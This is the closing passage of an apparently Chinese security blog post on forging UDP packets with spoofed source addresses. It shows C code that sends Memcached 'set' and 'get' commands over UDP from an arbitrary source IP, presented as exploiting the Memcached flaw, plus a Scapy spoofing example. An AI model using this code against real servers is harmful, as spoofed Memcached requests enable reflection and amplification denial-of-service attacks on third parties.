</span></span><span style=display:flex><span>        exit(<span style=color:#ae81ff>1</span>);
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#75715e>/* 发送ip_udp报文 */</span>
</span></span><span style=display:flex><span>    ip_udp_send(argv[<span style=color:#ae81ff>1</span>], atoi(argv[<span style=color:#ae81ff>2</span>]), argv[<span style=color:#ae81ff>3</span>], atoi(argv[<span style=color:#ae81ff>4</span>]), argv[<span style=color:#ae81ff>5</span>]);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>如果要利用Memcached漏洞：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>int</span> <span style=color:#a6e22e>main</span>(<span style=color:#66d9ef>int</span> argc, <span style=color:#66d9ef>const</span> <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>argv[])
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (argc <span style=color:#f92672>!=</span> <span style=color:#ae81ff>5</span>)
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>        printf(<span style=color:#e6db74>&#34;usage:%s src_ip src_port dst_ip dst_port data</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, argv[<span style=color:#ae81ff>0</span>]);
</span></span><span style=display:flex><span>        exit(<span style=color:#ae81ff>1</span>);
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>char</span> setBuff[<span style=color:#ae81ff>65535</span>]<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;set AAAA 0 1000&#34;</span>;
</span></span><span style=display:flex><span>    <span style=color:#75715e>/* 发送ip_udp报文 */</span>
</span></span><span style=display:flex><span>    ip_udp_send(argv[<span style=color:#ae81ff>1</span>], atoi(argv[<span style=color:#ae81ff>2</span>]), argv[<span style=color:#ae81ff>3</span>], atoi(argv[<span style=color:#ae81ff>4</span>]), setBuff);
</span></span><span style=display:flex><span>    
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>char</span> getBuff[<span style=color:#ae81ff>65535</span>]<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;get AAAA&#34;</span>;
</span></span><span style=display:flex><span>    ip_udp_send(argv[<span style=color:#ae81ff>1</span>], atoi(argv[<span style=color:#ae81ff>2</span>]), argv[<span style=color:#ae81ff>3</span>], atoi(argv[<span style=color:#ae81ff>4</span>]), getBuff);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><h2 id=0x05-其他方式>0x05 其他方式</h2><p>Python Scapy 伪造网络数据包</p><pre tabindex=0><code>
&gt;&gt;&gt; data = &#34;Hello Scapy&#34;
&gt;&gt;&gt; pkt = IP(src=&#39;172.16.2.135&#39;, dst=&#39;172.16.2.91&#39;)/UDP(sport=12345, dport=5555)/data
&gt;&gt;&gt; send(pkt, inter=1, count=1)
</code></pre></section><nav class="mt-24 flex overflow-hidden rounded-xl bg-black/[3%] text-lg leading-[1.2]! *:flex *:w-1/2 *:items-center *:p-5 *:font-medium *:no-underline dark:bg-white/[8%] [&>*:hover]:bg-black/[2%] dark:[&>*:hover]:bg-white/[3%]"><a class="ltr:pr-3 rtl:pl-3" href=https://payloads.online/archivers/2015-11-20/2/><span class="ltr:mr-1.5 rtl:ml-1.5">←</span><span>华为RIP协议</span></a><a class="justify-end pl-3 ltr:ml-auto rtl:mr-auto" href=https://payloads.online/archivers/2018-01-30/1/><span>针对某跨国企业的一次渗透测试-持续</span><span class="ltr:ml-1.5 rtl:mr-1.5">→</span></a></nav><div class="giscus mt-24"></div><script src=https://giscus.app/client.js data-repo=Rvn0xsy/rvn0xsy.github.io data-repo-id="MDEwOlJlcG9zaXRvcnk0MDEyMzI3MTY=" data-category=General data-category-id=DIC_kwDOF-pTTM4CRDk_ data-mapping=title data-strict=1 data-reactions-enabled=0 data-emit-metadata=0 data-input-position=top data-theme=light data-lang=zh-CN data-loading=lazy crossorigin=anonymous async></script></article></main><footer class="mx-auto flex h-[4.5rem] max-w-(--w) items-center px-8 text-xs tracking-wider uppercase opacity-60"><div class=mr-auto>倾旋 All rights reserved</div><a class="link mx-6" href=https://gohugo.io/ rel=noopener target=_blank>powered by hugo️️</a>️</footer></body></html>